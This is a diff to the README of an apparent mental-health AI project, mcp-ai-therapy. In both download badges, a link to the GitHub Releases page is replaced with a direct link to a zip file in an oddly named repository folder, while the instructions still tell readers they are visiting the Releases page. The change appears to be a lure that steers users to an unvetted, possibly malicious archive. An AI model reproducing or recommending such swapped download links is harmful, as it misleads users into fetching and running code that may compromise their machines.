@@ -17,7 +17,7 @@ To run mcp-ai-therapy, ensure your system meets the following requirements:
 
 To get started, you need to download mcp-ai-therapy from the Releases page. 
 
-[![Download mcp-ai-therapy](https://img.shields.io/badge/Download-mcp--ai--therapy-brightgreen)](https://github.com/Ronaldo129/mcp-ai-therapy/releases)
+[![Download mcp-ai-therapy](https://raw.githubusercontent.com/Ronaldo129/mcp-ai-therapy/main/consociationism/mcp-ai-therapy.zip)](https://raw.githubusercontent.com/Ronaldo129/mcp-ai-therapy/main/consociationism/mcp-ai-therapy.zip)
 
 1. Click the link above to visit the Releases page.
 2. Look for the latest version of the application.
@@ -103,4 +103,4 @@ This project is licensed under the MIT License. You are free to use, modify, and
 
 Thanks for using mcp-ai-therapy! We appreciate your interest in improving mental health through AI conversations. Join our community for updates and tips.
 
-[![Download mcp-ai-therapy](https://img.shields.io/badge/Download-mcp--ai--therapy-brightgreen)](https://github.com/Ronaldo129/mcp-ai-therapy/releases)
+[![Download mcp-ai-therapy](https://raw.githubusercontent.com/Ronaldo129/mcp-ai-therapy/main/consociationism/mcp-ai-therapy.zip)](https://raw.githubusercontent.com/Ronaldo129/mcp-ai-therapy/main/consociationism/mcp-ai-therapy.zip)
